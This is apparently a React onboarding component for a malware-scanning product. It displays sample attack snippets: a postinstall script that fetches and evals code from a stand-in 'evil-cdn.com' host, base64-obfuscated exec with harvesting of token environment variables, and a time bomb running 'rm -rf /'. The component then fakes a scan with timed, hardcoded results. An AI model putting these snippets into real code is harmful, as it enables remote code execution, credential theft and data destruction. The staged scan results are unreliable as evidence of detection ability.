"use client";

import { useState } from "react";
import { OnboardingStepProps } from "../OnboardingStep";

interface ScanResult {
  id: string;
  status: "scanning" | "complete";
  threats_found: number;
  ai_insights: number;
  confidence_score: number;
}

export default function FirstScanStep({ step, onComplete }: OnboardingStepProps): JSX.Element {
  const [selectedExample, setSelectedExample] = useState<string | null>(null);
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [isScanning, setIsScanning] = useState(false);

  // Example malicious code samples
  const examples = [
    {
      id: "supply-chain",
      name: "Supply Chain Attack",
      description: "Package with hidden eval() execution",
      language: "JavaScript",
      code: `// package.json postinstall script
const https = require('https');

https.get('https://evil-cdn.com/payload.js', (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    eval(data); // AI will detect this pattern
  });
});`
    },
    {
      id: "obfuscated",
      name: "Obfuscated Malware",
      description: "Base64-encoded credential theft",
      language: "Python",
      code: `import base64
import os

# Obfuscated credential harvesting
payload = "cHJvY2VzcyA9IG9zLmVudmlyb24="
decoded = base64.b64decode(payload)
exec(decoded) # AI detects obfuscation + exec combo

# Harvests environment variables
for key in os.environ:
    if 'API' in key or 'TOKEN' in key:
        send_to_server(key, os.environ[key])`
    },
    {
      id: "time-bomb",
      name: "Time Bomb Pattern",
      description: "Date-triggered destructive behavior",
      language: "Python",
      code: `import datetime
import subprocess

# Looks harmless until specific date
trigger_date = datetime.datetime(2024, 12, 25)

if datetime.datetime.now() > trigger_date:
    # AI detects this suspicious time-based pattern
    subprocess.run(['rm', '-rf', '/'], check=False)`
    }
  ];

  const runScan = async (): Promise<void> => {
    if (!selectedExample) return;
    
    setIsScanning(true);
    setScanResult({ 
      id: "scan_" + Date.now(), 
      status: "scanning", 
      threats_found: 0,
      ai_insights: 0,
      confidence_score: 0
    });

    // Simulate progressive scanning
    const steps = [
      { delay: 1000, update: { threats_found: 1 } },
      { delay: 1500, update: { threats_found: 3, ai_insights: 1 } },
      { delay: 2000, update: { threats_found: 5, ai_insights: 2, confidence_score: 0.85 } },
      { delay: 1000, update: { status: "complete" as const, threats_found: 7, ai_insights: 3, confidence_score: 0.92 } }
    ];

    for (const { delay, update } of steps) {
      await new Promise(resolve => setTimeout(resolve, delay));
      setScanResult(prev => prev ? { ...prev, ...update } : null);
    }

    setIsScanning(false);
  };

  const proceedToInsights = (): void => {
    onComplete(step.id, {
      exampleSelected: selectedExample,
      scanCompleted: true,
      scanResult,
      timestamp: new Date().toISOString()
    });
  };

  return (
    <div className="p-8">
      <div className="max-w-4xl mx-auto">
        {/* Step Description */}
        <div className="mb-8 text-center">
          <div className="w-16 h-16 bg-purple-600 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z" />
            </svg>
          </div>
          <h3 className="text-xl font-bold text-white mb-2">Run Your First AI-Powered Scan</h3>
          <p className="text-gray-400">
            Experience how Sigil Pro&apos;s AI detects sophisticated threats that traditional scanners miss.
          </p>
        </div>

        {!scanResult ? (
          <div>
            {/* Example Selection */}
            <div className="mb-8">
              <h4 className="text-lg font-semibold text-white mb-4">
                Choose a Malicious Code Example
              </h4>
              <div className="grid md:grid-cols-3 gap-4">
                {examples.map((example) => (
                  <button
                    key={example.id}
                    onClick={() => setSelectedExample(example.id)}
                    className={`p-4 rounded-lg border text-left transition-all ${
                      selectedExample === example.id
                        ? "border-purple-500 bg-purple-900 bg-opacity-30"
                        : "border-gray-600 bg-gray-800 hover:border-gray-500"
                    }`}
                  >
                    <div className={`text-sm font-medium mb-1 ${
                      selectedExample === example.id ? "text-purple-300" : "text-gray-400"
                    }`}>
                      {example.language}
                    </div>
                    <h5 className="text-white font-semibold mb-2">{example.name}</h5>
                    <p className="text-gray-400 text-sm">{example.description}</p>
                  </button>
                ))}
              </div>
            </div>

            {/* Selected Example Code */}
            {selectedExample && (
              <div className="mb-8">
                <h4 className="text-lg font-semibold text-white mb-4">Sample Code</h4>
                <div className="bg-gray-900 border border-gray-700 rounded-lg overflow-hidden">
                  <div className="bg-gray-800 px-4 py-2 border-b border-gray-700">
                    <span className="text-gray-400 text-sm font-mono">
                      {examples.find(e => e.id === selectedExample)?.language.toLowerCase()}.{
                        examples.find(e => e.id === selectedExample)?.language === "JavaScript" ? "js" : "py"
                      }
                    </span>
                  </div>
                  <pre className="p-4 text-green-400 font-mono text-sm overflow-x-auto">
                    {examples.find(e => e.id === selectedExample)?.code}
                  </pre>
                </div>
              </div>
            )}

            {/* Scan Button */}
            <div className="text-center">
              <button
                onClick={runScan}
                disabled={!selectedExample || isScanning}
                className={`px-8 py-3 rounded-lg font-semibold text-white transition-all ${
                  selectedExample && !isScanning
                    ? "bg-purple-600 hover:bg-purple-700"
                    : "bg-gray-600 cursor-not-allowed"
                }`}
              >
                {isScanning ? "Running AI Analysis..." : "Run Pro Scan"}
              </button>
              {selectedExample && (
                <p className="text-gray-400 text-sm mt-2">
                  This will demonstrate AI-powered threat detection
                </p>
              )}
            </div>
          </div>
        ) : (
          <div>
            {/* Scan Progress/Results */}
            <div className="bg-gray-900 border border-gray-700 rounded-lg p-6 mb-6">
              <div className="flex items-center justify-between mb-4">
                <h4 className="text-lg font-semibold text-white">Scan Results</h4>
                <span className={`px-3 py-1 rounded-full text-sm font-medium ${
                  scanResult.status === "complete" 
                    ? "bg-green-900 text-green-300 border border-green-700"
                    : "bg-yellow-900 text-yellow-300 border border-yellow-700"
                }`}>
                  {scanResult.status === "complete" ? "Complete" : "Analyzing..."}
                </span>
              </div>

              <div className="grid md:grid-cols-3 gap-6">
                <div className="text-center">
                  <div className="text-2xl font-bold text-red-400 mb-1">
                    {scanResult.threats_found}
                  </div>
                  <div className="text-sm text-gray-400">Threats Detected</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl font-bold text-purple-400 mb-1">
                    {scanResult.ai_insights}
                  </div>
                  <div className="text-sm text-gray-400">AI Insights</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl font-bold text-green-400 mb-1">
                    {scanResult.confidence_score > 0 ? Math.round(scanResult.confidence_score * 100) + "%" : "—"}
                  </div>
                  <div className="text-sm text-gray-400">Confidence</div>
                </div>
              </div>

              {scanResult.status === "complete" && (
                <div className="mt-6 pt-6 border-t border-gray-700">
                  <h5 className="text-white font-semibold mb-3">Key AI Detections</h5>
                  <div className="space-y-3">
                    <div className="flex items-start">
                      <div className="w-6 h-6 bg-red-600 rounded-full flex items-center justify-center mr-3 mt-0.5 flex-shrink-0">
                        <span className="text-white text-xs font-bold">1</span>
                      </div>
                      <div>
                        <p className="text-white font-medium">Dynamic Code Execution Pattern</p>
                        <p className="text-gray-400 text-sm">
                          AI detected eval() usage with remote data source - classic supply chain attack vector
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start">
                      <div className="w-6 h-6 bg-red-600 rounded-full flex items-center justify-center mr-3 mt-0.5 flex-shrink-0">
                        <span className="text-white text-xs font-bold">2</span>
                      </div>
                      <div>
                        <p className="text-white font-medium">Obfuscation Technique</p>
                        <p className="text-gray-400 text-sm">
                          Base64 encoding combined with exec() - designed to hide malicious intent
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start">
                      <div className="w-6 h-6 bg-red-600 rounded-full flex items-center justify-center mr-3 mt-0.5 flex-shrink-0">
                        <span className="text-white text-xs font-bold">3</span>
                      </div>
                      <div>
                        <p className="text-white font-medium">Time-Based Trigger</p>
                        <p className="text-gray-400 text-sm">
                          Destructive payload activates after specific date - sophisticated evasion technique
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {scanResult.status === "complete" && (
              <div className="text-center">
                <div className="bg-purple-900 bg-opacity-30 border border-purple-700 rounded-lg p-4 mb-6">
                  <p className="text-purple-300">
                    🎉 <strong>Amazing!</strong> The AI detected sophisticated attack patterns that traditional rule-based scanners would miss.
                  </p>
                </div>
                
                <button
                  onClick={proceedToInsights}
                  className="px-8 py-3 bg-purple-600 hover:bg-purple-700 text-white rounded-lg font-semibold transition-colors"
                >
                  Learn to Interpret AI Insights
                </button>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}